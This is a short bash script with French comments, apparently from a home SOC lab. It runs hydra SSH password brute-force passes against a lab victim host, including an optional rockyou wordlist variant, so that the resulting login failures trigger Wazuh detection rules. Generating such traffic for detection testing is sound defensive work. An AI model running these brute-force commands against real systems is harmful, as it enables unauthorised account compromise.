#!/usr/bin/env bash
# Brute force SSH contre victime-ubuntu (labo Home SOC)
# Génère les échecs d'authentification qui alimentent la détection Wazuh.
# Prérequis : hydra, passlist.txt dans le même dossier.
set -euo pipefail

TARGET="192.168.159.20"

# Passe 1 : utilisateur inexistant -> règle 5710
hydra -l nexistepas -P passlist.txt -t 4 "ssh://${TARGET}"

# Passe 2 : compte valide, mauvais mots de passe -> règle 5716
hydra -l amin -P passlist.txt -t 4 "ssh://${TARGET}"

# Variante volume réaliste (rockyou, à décompresser au préalable) :
#   sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
#   hydra -l nexistepas -P /usr/share/wordlists/rockyou.txt -t 4 "ssh://${TARGET}"   # ~15 s puis Ctrl-C
